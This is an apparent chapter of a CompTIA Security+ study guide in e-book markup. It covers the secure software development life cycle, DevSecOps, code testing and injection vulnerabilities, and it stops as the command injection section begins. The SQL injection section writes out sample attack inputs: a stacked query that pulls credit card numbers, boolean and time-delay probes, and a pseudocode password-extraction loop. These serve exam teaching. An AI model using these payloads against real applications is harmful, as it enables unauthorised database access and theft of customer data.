<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:svg="http://www.w3.org/2000/svg" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
<head>
<title>Chapter 6 Application Security</title>
<link href="WileyTemplate_v5.5.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:57d469d3-a1d3-48bd-8447-18ce82f57cc2" name="Adept.expected.resource"/>
</head>
<body epub:type="bodymatter">
<section aria-labelledby="c06_1" epub:type="chapter" role="doc-chapter">
<header>
<h1 id="c06_1"><span aria-label="141" epub:type="pagebreak" id="Page_141" role="doc-pagebreak"/><span id="c06"/><span class="chapterNumber">Chapter 6</span><br/><span class="chapterTitle">Application Security</span></h1>
</header>
<section aria-label="chapter opening"><span id="c06-sec-0001"/>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3">
<p><b>THE COMPTIA SECURITY+ EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE:</b></p>
<ul class="check1" id="c06-list-0002">
<li id="c06-li-0002"><b>Domain 2.0: Threats, Vulnerabilities, and Mitigations</b>
<ul class="square1" id="c06-list-0003">
<li id="c06-li-0003">2.3. Explain various types of vulnerabilities.
<ul class="square1" id="c06-list-0004">
<li id="c06-li-0004">Application (Memory injection, Buffer overflow, Race conditions (Time-of-check (TOC), Target of evaluation (TOE), Time-of-use (TOU)), Malicious update)</li>
<li id="c06-li-0005">Web-based (Structured Query Language injection (SQLi), Cross-site scripting (XSS))</li>
</ul>
</li>
<li id="c06-li-0006">2.4. Given a scenario, analyze indicators of malicious activity.
<ul class="square1" id="c06-list-0005">
<li id="c06-li-0007">Application attacks (Injection, Buffer overflow, Replay, Privilege escalation, Forgery, Directory traversal)</li>
</ul>
</li>
</ul>
</li>
<li id="c06-li-0008"><b>Domain 4.0: Security Operations</b>
<ul class="square1" id="c06-list-0006">
<li id="c06-li-0009">4.1. Given a scenario, apply common security techniques to computing resources.
<ul class="square1" id="c06-list-0007">
<li id="c06-li-0010">Application security (Input validation, Secure cookies, Static code analysis, Code signing)</li>
<li id="c06-li-0011">Sandboxing</li>
</ul>
</li>
<li id="c06-li-0012">4.3. Explain various activities associated with vulnerability management.
<ul class="square1" id="c06-list-0008">
<li id="c06-li-0013">Identification methods (Application security, Static analysis, Dynamic analysis, Package monitoring)</li>
</ul>
</li>
<li id="c06-li-0014">4.7. Explain the importance of automation and orchestration related to secure operations.
<ul class="square1" id="c06-list-0009">
<li id="c06-li-0015">Use cases of automation and scripting (User provisioning, Resource provisioning, Guard rails, Security groups, Ticket creation, Escalation, Enabling/disabling services <span aria-label="142" epub:type="pagebreak" id="Page_142" role="doc-pagebreak"/>and access, Continuous integration and testing, Integrations and Application programming interfaces (APIs))</li>
<li id="c06-li-0016">Benefits (Efficiency/time saving, Enforcing baselines, Standard infrastructure configurations, Scaling in a secure manner, Employee retention, Reaction time, Workforce multiplier)</li>
<li id="c06-li-0017">Other considerations (Complexity, Cost, Single point of failure, Technical debt, Ongoing supportability)</li>
</ul>
</li>
</ul>
</li>
<li id="c06-li-0018"><b>Domain 5.0: Security Program Management and Oversight</b>
<ul class="square1" id="c06-list-0010">
<li id="c06-li-0019">5.1. Summarize elements of effective security governance.
<ul class="square1" id="c06-list-0011">
<li id="c06-li-0020">Policies (Software development lifecycle (SDLC))</li>
</ul>
</li>
</ul>
</li>
</ul> <span aria-label="143" epub:type="pagebreak" id="Page_143" role="doc-pagebreak"/>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
<p id="c06-para-0013">Software ranging from customer-facing applications and services to smaller programs, down to the smallest custom scripts written to support business needs, is everywhere in our organizations. The process of designing, creating, supporting, and maintaining that software is known as the software development life cycle (SDLC). As a security practitioner, you need to understand the SDLC and its security implications to ensure that the software your organization uses is well written and secure throughout its lifespan.</p>
<p id="c06-para-0014">In this chapter, you will learn about major software development life cycle models and the reasons for choosing them. Next you will review software development security best practices and guidelines on secure software coding. As part of this, you will learn how software is tested and reviewed, and how these processes fit into the SDLC.</p>
<p id="c06-para-0015">Finally, you will learn about the common vulnerabilities that exist in software, including client-server and web-based applications. You'll learn how to recognize and defend against software security exploits.</p>
</section>
<section aria-labelledby="head-2-67"><span id="c06-sec-0002"/>
<h2 id="head-2-67">Software Assurance Best Practices</h2>
<p id="c06-para-0016">Building, deploying, and maintaining software requires security involvement throughout the software's life cycle. Secure software development life cycles include incorporating security concerns at every stage of the software development process.</p>
<section><span id="c06-sec-0003"/>
<h3 id="head-3-60">The Software Development Life Cycle</h3>
<p id="c06-para-0017">The <i>software development life cycle (SDLC)</i> describes the steps in a model for software development throughout its life. As shown in <a href="#c06-fig-0001" id="R_c06-fig-0001">Figure 6.1</a>, it maps software creation from an idea to requirements gathering and analysis to design, coding, testing, and rollout. Once software is in production, it also includes user training, maintenance, and decommissioning at the end of the software package's useful life.</p>
<p id="c06-para-0018">Software development does not always follow a formal model, but the majority of enterprise development for major applications does follow most, if not all, of these phases. In some cases, developers may even use elements of an SDLC model without realizing it!</p>
<p>The SDLC is useful for organizations and for developers because it provides a consistent framework to structure workflow and to provide planning for the development process. Despite these advantages, simply picking an SDLC model to implement may not always be <span aria-label="144" epub:type="pagebreak" id="Page_144" role="doc-pagebreak"/>the best choice. Each SDLC model has certain types of work and projects that it fits better than others, making choosing an SDLC model that fits the work an important part of the process.</p>
<figure> <img alt="A flow diagram illustrating high-level S D L C view. The steps include Planning, Requirements, Design, Coding, Testing, Training and Transition, Ongoing&#10;Operations and Maintenance, and End of Life Decommissioning." class="center" src="images/c06f001.png"/>
<figcaption>
<p><span class="figureLabel"><a href="#R_c06-fig-0001" id="c06-fig-0001" role="doc-backlink"><b>FIGURE 6.1</b></a></span> High-level SDLC view</p>
</figcaption>
</figure>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3">
<p id="c06-para-0020"><img alt="" role="presentation" src="images/note.png"/> In this chapter we will refer to the output of the SDLC as “software” or as an “application,” but the SDLC may be run for a service, a system, or other output. Feel free to substitute the right phrasing that is appropriate for you.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
</section>
<section><span id="c06-sec-0005"/>
<h3 id="head-3-61">Software Development Phases</h3>
<p>Regardless of which SDLC or process is chosen by your organization, a few phases appear in most SDLC models:</p>
<ol class="decimal" id="c06-list-0012">
<li id="c06-li-0021">The <i>planning</i> phase is where initial investigations into whether the effort should occur are conducted. This stage also looks at alternative solutions and high-level costs for each solution proposed. It results in a recommendation with a plan to move forward.</li>
<li id="c06-li-0022">Once an effort has been deemed feasible, it will typically go through a <i>requirements definition</i> phase. In this phase, customer input is sought to determine what the desired functionality is, what the current system or application currently does and doesn't do, and what improvements are desired. Requirements may be ranked to determine which are most critical to the success of the project.<span aria-label="145" epub:type="pagebreak" id="Page_145" role="doc-pagebreak"/>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3">
<p id="c06-para-0023"><img alt="" role="presentation" src="images/tip.png"/> <i>Security requirements definition</i> is an important part of the analysis and requirements definition phase. It ensures that the application is designed to be secure and that secure coding practices are used.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section></li>
<li id="c06-li-0023">The <i>design</i> phase includes design for functionality, architecture, integration points and techniques, dataflows, business processes, and any other elements that require design consideration.</li>
<li id="c06-li-0024">The actual coding of the application occurs during the <i>coding</i> phase. This phase may involve testing of parts of the software, including <i>unit testing</i>, the testing of small components individually to ensure they function properly.</li>
<li id="c06-li-0025">Although some testing is likely to occur in the coding phase, formal testing with customers or others outside of the development team occurs in the <i>testing</i> phase. Individual units or software components are integrated and then tested to ensure proper functionality. In addition, connections to outside services, data sources, and other integration may occur during this phase. During this phase <i>user acceptance testing</i> (UAT) occurs to ensure that the users of the software are satisfied with its functionality.</li>
<li id="c06-li-0026">The important task of ensuring that the end users are trained on the software and that the software has entered general use occurs in the <i>training and transition</i> phase. This phase is sometimes called the acceptance, installation, and deployment phase.</li>
<li id="c06-li-0027">Once a project reaches completion, the application or service will enter what is usually the longest phase: <i>operations and maintenance</i>. This phase includes patching, updating, minor modifications, and other work that goes into daily support.</li>
<li id="c06-li-0028">The <i>decommissioning</i> phase occurs when a product or system reaches the end of its life. Although disposition is often ignored in the excitement of developing new products, it is an important phase for a number of reasons: shutting down old products can produce cost savings, replacing existing tools may require specific knowledge or additional effort, and data and systems may need to be preserved or properly disposed of.</li>
</ol>
<p id="c06-para-0024">The order of the phases may vary, with some progressing in a simple linear fashion and others taking an iterative or parallel approach. You will still see some form of each of these phases in successful software life cycles.</p>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3"><span id="c06-fea-0001"/>
<h3 id="head-2-68">Code Deployment Environments</h3>
<section><span id="c06-sec-0007"/>
<p>Many organizations use multiple environments for their software and systems development and testing. The names and specific purposes for these systems vary depending on organizational needs, but the most common environments are as follows:</p>
<ul class="square" id="c06-list-0013">
<li id="c06-li-0029">The <i>development environment</i> is typically used for developers or other “builders” to do their work. Some workflows provide each developer with their own development environment; others use a shared development environment.</li>
<li id="c06-li-0030"><span aria-label="146" epub:type="pagebreak" id="Page_146" role="doc-pagebreak"/>The <i>test environment</i> is where the software or systems can be tested without impacting the production environment. In some schemes, this is preproduction, whereas in others a separate preproduction staging environment is used. <i>Quality assurance (QA)</i> activities take place in the test environment.</li>
<li id="c06-li-0031">The <i>staging environment</i> is a transition environment for code that has successfully cleared testing and is waiting to be deployed into production.</li>
<li id="c06-li-0032">The <i>production environment</i> is the live system. Software, patches, and other changes that have been tested and approved move to production.</li>
</ul>
<p id="c06-para-0026">Change management processes are typically followed to move through these environments. This provides accountability and oversight and may be required for audit or compliance purposes as well.</p>
</section>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3"><span id="c06-fea-0002"/>
<h3 id="head-2-69">Exam Note</h3>
<section><span id="c06-sec-0008"/>
<p id="c06-para-0027">Remember that the software development life cycle (SDLC) describes the steps in a model for software development throughout its life. It maps software creation from an idea to requirements gathering and analysis to design, coding, testing, and rollout. Secure SDLC practices aim to integrate security into the development process.</p>
</section>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
</section>
<section><span id="c06-sec-0009"/>
<h3 id="head-3-62">DevSecOps and DevOps</h3>
<p id="c06-para-0028"><i>DevOps</i> combines software development and IT operations with the goal of optimizing the SDLC. This is done by using collections of tools called toolchains to improve SDLC processes. The toolchain includes tools that assist with coding, building, testing, packaging, releasing, configuring monitoring software.</p>
<p id="c06-para-0029">Of course, DevOps should have security baked into it as well. The term <i>DevSecOps</i> describes security as part of the DevOps model. In this model, security is a shared responsibility that is part of the entire development and operations cycle. That means integrating security into the design, development, testing, and operational work done to produce applications and services.</p>
<p id="c06-para-0030">The role of security practitioners in a DevSecOps model includes threat analysis and communications, planning, testing, providing feedback, and of course, ongoing improvement and awareness responsibilities. To do this requires a strong understanding of the organization's risk tolerance, as well as awareness of what the others involved in the DevSecOps environment are doing and when they are doing it. DevOps and DevSecOps are often combined <span aria-label="147" epub:type="pagebreak" id="Page_147" role="doc-pagebreak"/>with continuous integration and continuous deployment methodologies, where they can rely on automated security testing, and integrated security tooling, including scanning, updates, and configuration management tools, to help ensure security.</p>
<section><span id="c06-sec-0010"/>
<h4 id="head-4-45">Continuous Integration and Continuous Deployment</h4>
<p id="c06-para-0031"><i>Continuous integration</i> (<i>CI</i>) is a development practice that consistently (and on an ongoing basis) checks code into a shared repository. In CI environments, this can range from a few times a day to a very frequent process of check-ins and automated builds. The main goal of this approach is to enable the use of automation and scripting to implement automated courses of action that result in continuous delivery of code.</p>
<p id="c06-para-0032">Since continuous integration relies on an automated build process, it also requires automated testing. It is also often paired with <i>continuous deployment</i> (<i>CD</i>) (sometimes called continuous delivery), which rolls out tested changes into production automatically as soon as they have been tested.</p>
<p id="c06-para-0033"><a href="#c06-fig-0002" id="R_c06-fig-0002">Figure 6.2</a> shows a view of the continuous integration/continuous deployment pipeline.</p>
<figure> <img alt="A flow diagram illustrating the C I or C D pipeline. The flow includes Developer commits change, Build process is triggered, Build report delivered, Tests run against the build, Test report delivered, and If successful, code is deployed." class="center" src="images/c06f002.png"/>
<figcaption>
<p><span class="figureLabel"><a href="#R_c06-fig-0002" id="c06-fig-0002" role="doc-backlink"><b>FIGURE 6.2</b></a></span> The CI/CD pipeline</p>
</figcaption>
</figure>
<p id="c06-para-0034">Using continuous integration and continuous deployment methods requires building <i>continuous validation</i> and automated security testing into the pipeline testing process. It can result in new vulnerabilities being deployed into production and could allow an untrusted or rogue developer to insert flaws into code that is deployed and then remove the code as part of a deployment in the next cycle. This means that logging, reporting, and <i>continuous monitoring</i> must all be designed to fit the CI/CD process.</p>
</section>
</section>
</section>
<section aria-labelledby="head-2-70"><span id="c06-sec-0011"/>
<h2 id="head-2-70">Designing and Coding for Security</h2>
<p id="c06-para-0035">Participating in the SDLC as a security professional provides significant opportunities to improve the security of applications. The first chance to help with software security is in the requirements gathering and design phases, when security can be built in as part of the requirements and then designed in based on those requirements. Later, during the development process, secure coding techniques, code review, and testing can improve the quality and security of the code that is developed.</p>
<p id="c06-para-0036"><span aria-label="148" epub:type="pagebreak" id="Page_148" role="doc-pagebreak"/>During the testing phase, fully integrated software can be tested using tools like web application security scanners or penetration testing techniques. This also provides the foundation for ongoing security operations by building the baseline for future security scans and regression testing during patching and updates. Throughout these steps, it helps to understand the common security issues that developers face, create, and discover.</p>
<section><span id="c06-sec-0012"/>
<h3 id="head-3-63">Secure Coding Practices</h3>
<p id="c06-para-0037">One of the best resources for secure coding practices is the Open Worldwide Application Security Project (OWASP). OWASP is the home of a broad community of developers and security practitioners, and it hosts many community-developed standards, guides, and best practice documents, as well as a multitude of open source tools. OWASP provides a regularly updated list of proactive controls that is useful to review not only as a set of useful best practices, but also as a way to see how web application security threats change from year to year.</p>
<p>Here are OWASP's top proactive controls with brief descriptions:</p>
<ul class="none" id="c06-list-0014">
<li id="c06-li-0033"><b>Define Security Requirements</b> Implement security throughout the development process.</li>
<li id="c06-li-0034"><b>Leverage Security Frameworks and Libraries</b> Preexisting security capabilities can make securing applications easier.</li>
<li id="c06-li-0035"><b>Secure Database Access</b> Prebuild SQL queries to prevent injection and configure databases for secure access.</li>
<li id="c06-li-0036"><b>Encode and Escape Data</b> Remove special characters.</li>
<li id="c06-li-0037"><b>Validate All Inputs</b> Treat user input as untrusted and filter appropriately.</li>
<li id="c06-li-0038"><b>Implement Digital Identity</b> Use multifactor authentication, secure password storage and recovery, and session handling.</li>
<li id="c06-li-0039"><b>Enforce Access Controls</b> Require all requests to go through access control checks, deny by default, and apply the principle of least privilege.</li>
<li id="c06-li-0040"><b>Protect Data Everywhere</b> Use encryption in transit and at rest.</li>
<li id="c06-li-0041"><b>Implement Security Logging and Monitoring</b> This helps detect problems and allows investigation after the fact.</li>
<li id="c06-li-0042"><b>Handle All Errors and Exceptions</b> Errors should not provide sensitive data, and applications should be tested to ensure that they handle problems gracefully.</li>
</ul>
<p id="c06-para-0049">You can find OWASP's Proactive Controls list at <code><a href="https://owasp.org/www-project-proactive-controls">https://owasp.org/www-project-proactive-controls</a></code>, and a useful quick reference guide to secure coding practices is available at <code><a href="https://owasp.org/www-project-secure-coding-practices-quick-reference-guide">https://owasp.org/www-project-secure-coding-practices-quick-reference-guide</a></code>.</p>
</section> <span aria-label="149" epub:type="pagebreak" id="Page_149" role="doc-pagebreak"/>
<section><span id="c06-sec-0013"/>
<h3 id="head-3-64">API Security</h3>
<p id="c06-para-0050"><i>Application programming interfaces</i> (APIs) are interfaces between clients and servers or applications and operating systems that define how the client should ask for information from the server and how the server will respond. This definition means that programs written in any language can implement the API and make requests.</p>
<p>APIs are tremendously useful for building interfaces between systems, but they can also be a point of vulnerability if they are not secured properly. API security relies on authentication, authorization, proper data scoping to ensure that too much data isn't released, rate limiting, input filtering, and appropriate monitoring and logging to remain secure. Of course, securing the underlying systems, configuring the API endpoint server or service, and providing normal network layer security to protect the service are also important.</p>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3">
<p id="c06-para-0052"><img alt="" role="presentation" src="images/note.png"/> OWASP's API Security Project provides a useful breakdown of API security techniques. You can read more at <code><a href="http://www.owasp.org/index.php/OWASP_API_Security_Project">www.owasp.org/index.php/OWASP_API_Security_Project</a></code>.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
<p id="c06-para-0053">Many security tools and servers provide APIs, and security professionals are often asked to write scripts or programs that can access an API to pull data.</p>
</section>
</section>
<section aria-labelledby="head-2-71"><span id="c06-sec-0015"/>
<h2 id="head-2-71">Software Security Testing</h2>
<p>No matter how well talented the development team for an application is, there will be some form of flaws in the code. Veracode's 2023 metrics for applications based on their testing showed that 74 percent of the applications they scanned exhibited at least one security issue during the testing process. That number points to a massive need for software security testing to continue to be better integrated into the software development life cycle.</p>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3">
<p id="c06-para-0055"><img alt="" role="presentation" src="images/note.png"/> In addition to these statistics, Veracode provides a useful yearly review of the state of software security. You can read more of the 2023 report at <code><a href="https://info.veracode.com/rs/790-ZKW-291/images/Veracode_State_of_Software_Security_2023.pdf">https://info.veracode.com/rs/790-ZKW-291/images/Veracode_State_of_Software_Security_2023.pdf</a></code>.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
<p id="c06-para-0056">A broad variety of manual and automatic testing tools and methods are available to security professionals and developers. Fortunately, automated tools have continued to improve, providing an easier way to verify that code is more secure. Over the next few pages, we will review some of the critical software security testing methods and tools available today.</p> <span aria-label="150" epub:type="pagebreak" id="Page_150" role="doc-pagebreak"/>
<section><span id="c06-sec-0017"/>
<h3 id="head-3-65">Analyzing and Testing Code</h3>
<p id="c06-para-0057">The source code that is the basis of every application and program can contain a variety of bugs and flaws, from programming and syntax errors to problems with business logic, error handling, and integration with other services and systems. It is important to be able to analyze the code to understand what the code does, how it performs that task, and where flaws may occur in the program itself. This is often done via static or dynamic code analysis along with testing methods like fuzzing. Once changes are made to code and it is deployed, it must be regression tested to ensure that the fixes put in place didn't create new security issues!</p>
<section><span id="c06-sec-0018"/>
<h4 id="head-4-46">Static Code Analysis</h4>
<p id="c06-para-0058">As you learned in <a href="c05.xhtml">Chapter 5</a>, “Security Assessment and Testing,” <i>static code analysis</i> (sometimes called source code analysis) is conducted by reviewing the code for an application. Since static analysis uses the source code for an application, it can be seen as a type of known-environment testing with full visibility to the testers. This can allow testers to find problems that other tests might miss, either because the logic is not exposed to other testing methods or because of internal business logic problems.</p>
<p>Unlike many other methods, static analysis does not run the program; instead, it focuses on understanding how the program is written and what the code is intended to do. Static code analysis can be conducted using automated tools or manually by reviewing the code—a process sometimes called “code understanding.” Automated static code analysis can be very effective at finding known issues, and manual static code analysis helps to identify programmer-induced errors.</p>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3">
<p id="c06-para-0060"><img alt="" role="presentation" src="images/note.png"/> OWASP provides static code analysis tools at <code><a href="https://owasp.org/www-community/controls/Static_Code_Analysis">https://owasp.org/www-community/controls/Static_Code_Analysis</a></code>.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
</section>
<section><span id="c06-sec-0020"/>
<h4 id="head-4-47">Dynamic Code Analysis</h4>
<p id="c06-para-0061"><i>Dynamic code analysis</i> relies on execution of the code while providing it with input to test the software. Much like static code analysis, dynamic code analysis may be done via automated tools or manually, but there is a strong preference for automated testing due to the volume of tests that need to be conducted in most dynamic code testing processes.</p>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3"><span id="c06-fea-0003"/>
<h3 id="head-2-72">Exam Note</h3>
<section><span id="c06-sec-0021"/>
<p id="c06-para-0062">Know that static testing analyzes code without executing it. This approach points developers directly at vulnerabilities and often provides specific remediation suggestions. Dynamic testing executes code as part of the test, running all the interfaces that the code exposes to the user with a variety of inputs, searching for vulnerabilities.</p>
</section>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
</section> <span aria-label="151" epub:type="pagebreak" id="Page_151" role="doc-pagebreak"/>
<section><span id="c06-sec-0022"/>
<h4 id="head-4-48">Fuzzing</h4>
<p id="c06-para-0063"><i>Fuzz testing</i>, or <i>fuzzing</i>, involves sending invalid or random data to an application to test its ability to handle unexpected data. The application is monitored to determine if it crashes, fails, or responds in an incorrect manner. Fuzzing is typically automated due to the large amount of data that a fuzz test involves, and it is particularly useful for detecting input validation and logic issues as well as memory leaks and error handling. Unfortunately, fuzzing tends to only identify simple problems—it does not account for complex logic or business process issues, and it may not provide complete code coverage if its progress is not monitored.</p>
</section>
</section>
</section>
<section aria-labelledby="head-2-73"><span id="c06-sec-0023"/>
<h2 id="head-2-73">Injection Vulnerabilities</h2>
<p id="c06-para-0064">Now that you have a good understanding of secure code development and testing practices, let's turn our attention to the motivating force behind putting these mechanisms in place: the vulnerabilities that attackers may exploit to undermine our security. We'll look at a number of different vulnerability categories in this chapter.</p>
<p id="c06-para-0065"><i>Injection vulnerabilities</i> are among the primary mechanisms that attackers use to break through a web application and gain access to the systems supporting that application. These vulnerabilities allow an attacker to supply some type of code to the web application as input and trick the web server into either executing that code or supplying it to another server to execute.</p>
<section><span id="c06-sec-0024"/>
<h3 id="head-3-66">SQL Injection Attacks</h3>
<p>Web applications often receive input from users and use it to compose a database query that provides results that are sent back to a user. For example, consider the search function on an e-commerce site. If a user enters <b>orange tiger pillow</b> into the search box, the web server needs to know what products in the catalog might match this search term. It might send a request to the backend database server that looks something like this:</p>
<pre id="c06-code-0001"><code>SELECT ItemName, ItemDescription, ItemPrice</code>
<code>FROM Products</code>
<code>WHERE ItemName LIKE '%orange%' AND</code>
<code>ItemName LIKE '%tiger%' AND</code>
<code>ItemName LIKE '%pillow%'</code>
</pre>
<p>This command retrieves a list of items that can be included in the results returned to the end user. In a <i>SQL injection (SQLi)</i> attack, the attacker might send a very unusual-looking request to the web server, perhaps searching for</p>
<pre id="c06-code-0002"><code>orange tiger pillow'; SELECT CustomerName, CreditCardNumber FROM Orders; --</code>
</pre>
<p><span aria-label="152" epub:type="pagebreak" id="Page_152" role="doc-pagebreak"/>If the web server simply passes this request along to the database server, it would do this (with a little reformatting for ease of viewing):</p>
<pre id="c06-code-0003"><code>SELECT ItemName, ItemDescription, ItemPrice</code>
<code>FROM Products</code>
<code>WHERE ItemName LIKE '%orange%' AND</code>
<code>ItemName LIKE '%tiger%' AND</code>
<code>ItemName LIKE '%pillow';</code>
<code>SELECT CustomerName, CreditCardNumber</code>
<code>FROM Orders;</code>
<code>--%'</code>
</pre>
<p id="c06-para-0069">This command, if successful would run two different SQL queries (separated by the semicolon). The first would retrieve the product information, and the second would retrieve a listing of customer names and credit card numbers.</p>
<p id="c06-para-0070">In the basic SQL injection attack we just described, the attacker is able to provide input to the web application and then monitor the output of that application to see the result. Though that is the ideal situation for an attacker, many web applications with SQL injection flaws do not provide the attacker with a means to directly view the results of the attack. However, that does not mean the attack is impossible; it simply makes it more difficult. Attackers use a technique called <i>blind SQL injection</i> to conduct an attack even when they don't have the ability to view the results directly. We'll discuss two forms of blind SQL injection: content-based and timing-based.</p>
<section><span id="c06-sec-0025"/>
<h4 id="head-4-49">Blind Content-Based SQL Injection</h4>
<p id="c06-para-0071">In a content-based blind SQL injection attack, the perpetrator sends input to the web application that tests whether the application is interpreting injected code before attempting to carry out an attack. For example, consider a web application that asks a user to enter an account number. A simple version of this web page might look like the one shown in <a href="#c06-fig-0003" id="R_c06-fig-0003">Figure 6.3</a>.</p>
<figure> <img alt="A snapshot of the account number input page. The title is the account query page. It has a space to fill in the account number and a submit option at the bottom." class="center" src="images/c06f003.png"/>
<figcaption>
<p><span class="figureLabel"><a href="#R_c06-fig-0003" id="c06-fig-0003" role="doc-backlink"><b>FIGURE 6.3</b></a></span> Account number input page</p>
</figcaption>
</figure>
<p id="c06-para-0072">When a user enters an account number into that page, they will next see a listing of the information associated with that account, as shown in <a href="#c06-fig-0004" id="R_c06-fig-0004">Figure 6.4</a>.</p> <span aria-label="153" epub:type="pagebreak" id="Page_153" role="doc-pagebreak"/>
<figure> <img alt="A snapshot of the account information page. The title is the account information. It has the account number, first name, last name, and balance." class="center" src="images/c06f004.png"/>
<figcaption>
<p><span class="figureLabel"><a href="#R_c06-fig-0004" id="c06-fig-0004" role="doc-backlink"><b>FIGURE 6.4</b></a></span> Account information page</p>
</figcaption>
</figure>
<p>The SQL query supporting this application might be something similar to this, where the <code>$account</code> field is populated from the input field in <a href="#c06-fig-0003">Figure 6.3</a>:</p>
<pre id="c06-code-0004"><code>SELECT FirstName, LastName, Balance</code>
<code>FROM Accounts</code>
<code>WHERE AccountNumber = '$account'</code>
</pre>
<p>In this scenario, an attacker could test for a standard SQL injection vulnerability by placing the following input in the <code>AccountNumber</code> field:</p>
<pre id="c06-code-0005"><code>52019' OR 1=1;--</code>
</pre>
<p>If successful, this would result in the following query being sent to the database:</p>
<pre id="c06-code-0006"><code>SELECT FirstName, LastName, Balance</code>
<code>FROM Accounts</code>
<code>WHERE AccountNumber = '52019' OR 1=1</code>
</pre>
<p id="c06-para-0076">This query would match all results. However, the design of the web application may ignore any query results beyond the first row. If this is the case, the query would display the same results as shown in <a href="#c06-fig-0004">Figure 6.4</a>. Though the attacker may not be able to see the results of the query, that does not mean the attack was unsuccessful. However, with such a limited view into the application, it is difficult to distinguish between a well-defended application and a successful attack.</p>
<p>The attacker can perform further testing by taking input that is known to produce results, such as providing the account number 52019 from <a href="#c06-fig-0004">Figure 6.4</a> and using SQL that modifies that query to return <i>no</i> results. For example, the attacker could provide this input to the field:</p>
<pre id="c06-code-0007"><code>52019' AND 1=2;--</code>
</pre>
<p>If the web application is vulnerable to blind SQL injection attacks, it would send the following query to the database:</p>
<pre id="c06-code-0008"><code>SELECT FirstName, LastName, Balance</code>
<code>FROM Accounts</code>
<code>WHERE AccountNumber = '52019' AND 1=2</code>
</pre>
<p id="c06-para-0079">This query, of course, never returns any results because 1 is never equal to 2! Therefore, the web application would return a page with no results, such as the one shown in <span aria-label="154" epub:type="pagebreak" id="Page_154" role="doc-pagebreak"/><a href="#c06-fig-0005" id="R_c06-fig-0005">Figure 6.5</a>. If the attacker sees this page, they can be reasonably sure that the application is vulnerable to blind SQL injection and can then attempt more malicious queries that alter the contents of the database or perform other unwanted actions.</p>
<figure> <img alt="A snapshot of the account information page after blind S Q L injection. The title is the account information. It has the account number, first name, last name, and balance." class="center" src="images/c06f005.png"/>
<figcaption>
<p><span class="figureLabel"><a href="#R_c06-fig-0005" id="c06-fig-0005" role="doc-backlink"><b>FIGURE 6.5</b></a></span> Account information page after blind SQL injection</p>
</figcaption>
</figure>
</section>
<section><span id="c06-sec-0026"/>
<h4 id="head-4-50">Blind Timing-Based SQL Injection</h4>
<p id="c06-para-0080">In addition to using the content returned by an application to assess susceptibility to blind SQL injection attacks, penetration testers may use the amount of time required to process a query as a channel for retrieving information from a database.</p>
<p>These attacks depend on delay mechanisms provided by different database platforms. For example, Microsoft SQL Server's Transact-SQL allows a user to specify a command such as this:</p>
<pre id="c06-code-0009"><code>WAITFOR DELAY '00:00:15'</code>
</pre>
<p>This command would instruct the database to wait 15 seconds before performing the next action. An attacker seeking to verify whether an application is vulnerable to time-based attacks might provide the following input to the account ID field:</p>
<pre id="c06-code-0010"><code>52019'; WAITFOR DELAY '00:00:15'; --</code>
</pre>
<p id="c06-para-0083">An application that immediately returns the result shown in <a href="#c06-fig-0004">Figure 6.4</a> is probably not vulnerable to timing-based attacks. However, if the application returns the result after a 15-second delay, it is likely vulnerable.</p>
<p id="c06-para-0084">This might seem like a strange attack, but it can actually be used to extract information from the database. For example, imagine that the Accounts database table used in the previous example contains an unencrypted field named Password. An attacker could use a timing-based attack to discover the password by checking it letter by letter.</p>
<p>The SQL to perform a timing-based attack is a little complex, and you won't need to know it for the exam. Instead, here's some pseudocode that illustrates how the attack works conceptually:</p>
<pre id="c06-code-0011"><code>For each character in the password</code>
<code>   For each letter in the alphabet</code>
<code>    If the current character is equal to the current letter, wait 15</code>
<code>     seconds before returning results</code>
</pre>
<p id="c06-para-0086"><span aria-label="155" epub:type="pagebreak" id="Page_155" role="doc-pagebreak"/>In this manner, an attacker can cycle through all the possible password combinations to ferret out the password character by character. This may seem tedious, but security tools like SQLmap and Metasploit automate blind timing–based attacks, making them quite straightforward.</p>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3"><span id="c06-fea-0004"/>
<h3 id="head-2-74">Exam Note</h3>
<section><span id="c06-sec-0027"/>
<p id="c06-para-0087">In a SQL injection attack, malicious code is inserted into strings of code that are later passed to a SQL database server.</p>
</section>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
</section>
</section>
<section><span id="c06-sec-0028"/>
<h3 id="head-3-67">Code Injection Attacks</h3>
<p id="c06-para-0088">SQL injection attacks are a specific example of a general class of attacks known as <i>code injection</i> attacks. These attacks seek to insert attacker-written code into the legitimate code created by a web application developer. Any environment that inserts user-supplied input into code written by an application developer may be vulnerable to a code injection attack.</p>
<p id="c06-para-0089">Similar attacks may take place against other environments. For example, attackers might embed commands in text being sent as part of a Lightweight Directory Access Protocol (LDAP) query, conducting an <i>LDAP injection attack</i>. They might also attempt to embed code in Extensible Markup Language (XML) documents, conducting an <i>XML injection attack</i>. Commands may even attempt to load dynamically linked libraries (DLLs) containing malicious code in a <i>DLL injection attack</i>.</p>
<p id="c06-para-0090">In addition to SQL injection, cross-site scripting is an example of a code injection attack that inserts HTML code written by an attacker into the web pages created by a developer. We'll discuss cross-site scripting in detail later in the section “Cross-Site Scripting (XSS).”</p>
</section>
<section><span id="c06-sec-0029"/>
<h3 id="head-3-68">Command Injection Attacks</h3>
